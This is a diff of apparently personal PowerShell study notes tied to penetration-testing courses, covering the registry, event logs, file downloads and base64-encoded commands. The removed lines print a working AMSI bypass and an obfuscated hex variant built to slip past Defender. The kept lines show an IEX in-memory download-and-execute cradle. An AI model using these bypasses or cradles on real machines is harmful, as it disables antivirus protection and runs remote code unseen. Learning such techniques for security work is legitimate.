@@ -1,7 +1,7 @@
 # Using PowerShell
 
 author:: Nathan Acks  
-date:: 2022-08-26
+date:: 2022-08-31
 
 ## Access the Registry Through PowerShell
 
@@ -21,6 +21,8 @@ Major hives:
 
 Use the `Get-WinEvent` cmdlet.
 
+* [Get-WinEvent](get-winevent.md)
+
 ### Download a File
 
 ```powershell
@@ -30,30 +32,29 @@ Invoke-WebRequest -Uri $URL_OF_FILE -OutFile $FILE_ON_DISK
 
 # Download into a variable (useful for scripts!)
 #
-$SCRIPT_DATA = (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")
+$SCRIPT_DATA = `
+	(New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")
 
 # Download and invoke from memory
 #
 IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")
 ```
 
-### Disable AMSI
+### Using Base64 Encoding
 
-Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of `IEX` for in-memory scripts!).
-
-One bypass for this:
+Encode a command to base64 in PowerShell:
 
 ```powershell
-[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$Text = "$ONE_LINE_POWERSHELL_COMMAND"
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText = [Convert]::ToBase64String($Bytes)
 ```
 
-Note that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.
+Run this using:
 
 ```powershell
-[REF].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+powershell.exe -enc $EncodedText
 ```
-
-Be aware that AMSI bypasses are *per session*, not global!
 
 ### Manipulating Services
 
@@ -71,15 +72,6 @@ The algorithm can be excluded (in which case SHA-256 is used). *Lots* of differe
 
 ## Run PowerShell from cmd.exe
 
-```bat
+```powershell
 powershell -c "$COMMAND"
 ```
-
-## References
-
-* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
-* [Get-WinEvent](get-winevent.md)
-* [TryHackMe: MAL: Researching](tryhackme-mal-researching.md)
-* [2022-08-24 - OffSec Live: PEN-200 & AWS Deep Dive](../log/2022-08-24-offsec-live-pen-200-and-aws-deep-dive.md)
-* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
-* [2022-08-26 - OffSec Live: PEN-200](../log/2022-08-26-offsec-live-pen-200.md)
